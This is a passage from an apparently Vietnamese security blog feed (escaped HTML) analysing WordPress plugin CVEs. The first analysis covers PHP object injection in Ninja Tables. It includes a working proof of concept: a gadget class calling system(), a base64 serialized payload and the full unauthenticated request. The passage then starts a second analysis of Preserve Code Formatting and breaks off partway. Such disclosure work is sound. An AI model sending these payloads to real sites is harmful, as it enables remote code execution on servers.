&lt;code&gt;&amp;quot;wpf-async-request-&amp;quot;&lt;/code&gt; concatenated with the SHA1 hash of the plugin slug. Since the plugin slug is &lt;code&gt;ninja-tables&lt;/code&gt;, the final value becomes:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$params&lt;/code&gt; contains all data within &lt;code&gt;args[...]&lt;/code&gt; from the request, after removing the control fields (&lt;code&gt;action&lt;/code&gt;, &lt;code&gt;args.url&lt;/code&gt;, &lt;code&gt;args.method&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;p&gt;=&amp;gt; When a request is sent to &lt;code&gt;/wp-admin/admin-post.php&lt;/code&gt; with &lt;code&gt;action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&lt;/code&gt;, then &lt;code&gt;getCallback($params)&lt;/code&gt; is executed.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;&#xD;&#xA;A[&#34;Unauthenticated&amp;ensp;user&amp;ensp;sends&amp;ensp;GET&amp;ensp;/wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&amp;args[callback]=base64_payload&#34;]&#xD;&#xA;--&gt;&amp;ensp;B[&#34;WordPress&amp;ensp;triggers&amp;ensp;hook&amp;ensp;admin_post_nopriv_wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&#34;]&#xD;&#xA;&#xD;&#xA;B&amp;ensp;--&gt;&amp;ensp;C[&#34;Plugin&amp;ensp;handler&amp;ensp;calls&amp;ensp;getCallback($params)&#34;]&#xD;&#xA;C&amp;ensp;--&gt;&amp;ensp;D[&#34;Decode&amp;ensp;base64&amp;ensp;and&amp;ensp;unserialize&amp;ensp;payload&#34;]&#xD;&#xA;D&amp;ensp;--&gt;&amp;ensp;E[&#34;Malicious&amp;ensp;object&amp;ensp;instantiated&amp;ensp;→&amp;ensp;RCE&#34;]&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a class for testing in &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nc&#34;&gt;Evil&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$command&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ls&amp;ensp;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;fm&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Let the request pass through BurpSuite proxy&lt;/li&gt;&#xA;&lt;li&gt;Resend the request with args[callback] containing a serialized payload encoded in base64&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;callback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;base64_encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;O:4:&amp;#34;Evil&amp;#34;:1:{s:7:&amp;#34;command&amp;#34;;s:4:&amp;#34;ls&amp;ensp;/&amp;#34;;}&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-HTTP&#34; data-lang=&#34;HTTP&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;GET&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nn&#34;&gt;/wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&amp;amp;args[callback]=Tzo0OiJFdmlsIjoxOntzOjc6ImNvbW1hbmQiO3M6NDoibHMgLyI7fQ==&lt;/span&gt;&amp;ensp;&lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1.1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;localhost&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-21-cve-2025-2939/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2025-11-21-cve-2025-2939/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-21-cve-2025-2939/result.png&#39; alt=&#34;Result&#34; height=&#34;828&#34; width=&#34;1471&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h1&gt;&lt;p&gt;Versions &amp;lt;= 5.0.18 of the Ninja Tables plugin handle the &lt;code&gt;args[callback]&lt;/code&gt; parameter insecurely, executing &lt;code&gt;unserialize()&lt;/code&gt; on user input without any validation. This allows an unauthenticated attacker to supply a serialized object payload and achieve code execution on the server. The 5.0.19 update completely removes the use of &lt;code&gt;unserialize()&lt;/code&gt; and replaces it with &lt;code&gt;json_decode&lt;/code&gt;, fully resolving the issue.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;unserialize()&lt;/code&gt; must not be used on client-supplied input without validation.&lt;/li&gt;&#xA;&lt;li&gt;The Ajax hook &lt;code&gt;admin_post_nopriv_*&lt;/code&gt; exposes an attack surface to unauthenticated users.&lt;/li&gt;&#xA;&lt;li&gt;A single crafted HTTP request is enough to trigger exploitation.&lt;/li&gt;&#xA;&lt;li&gt;Version 5.0.19 correctly mitigates the issue by switching to a safer format such as JSON.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ninja-tables/vulnerability/wordpress-ninja-tables-easy-data-table-builder-plugin-5-0-18-unauthenticated-php-object-injection-to-limited-remote-code-execution-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Ninja Tables – Easy Data Table Builder Plugin &amp;lt;= 5.0.18 is vulnerable to a high priority PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-53572 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-20-cve-2025-49386/</link>
      <pubDate>Thu, 20 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-20-cve-2025-49386/</guid>
      <category domain="http://localhost:1313/categories/cve-analyst/">CVE Analyst</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-20-cve-2025-49386/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Deserialization of Untrusted Data&lt;/strong&gt; vulnerability in Scott Reilly’s &lt;strong&gt;Preserve Code Formatting&lt;/strong&gt; plugin (&lt;em&gt;preserve-code-formatting&lt;/em&gt;) allows &lt;strong&gt;Object Injection&lt;/strong&gt;. This issue affects &lt;strong&gt;Preserve Code Formatting&lt;/strong&gt; versions from &lt;code&gt;n/a&lt;/code&gt; up to &lt;code&gt;&amp;lt;=&amp;ensp;4.0.1&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-53572&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-53572&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.0.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS Severity&lt;/strong&gt;: High (8.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/preserve-code-formatting/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Preserve Code Formatting Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; – &lt;strong&gt;Preserve Code Formatting&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.0.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;5.0&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any other diff tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v4.0.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;chunk_split_token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;stripslashes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;base64_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In this code, the &lt;code&gt;unserialize()&lt;/code&gt; function is executed directly on user-supplied input (&lt;code&gt;$match[2]&lt;/code&gt; after Base64 decoding). This introduces a critical vulnerability:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Object Injection risk&lt;/strong&gt;: If an attacker injects a malicious serialized PHP object encoded in Base64, decoding and unserializing will instantiate the malicious object, leading to &lt;strong&gt;Object Injection&lt;/strong&gt; and potentially &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;No validation&lt;/strong&gt;: There are no checks in place to validate the data before calling &lt;code&gt;unserialize()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;No fallback mechanism&lt;/strong&gt;: If the data is malformed or fails to decode, the application does not handle errors safely, increasing exploitability.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched version 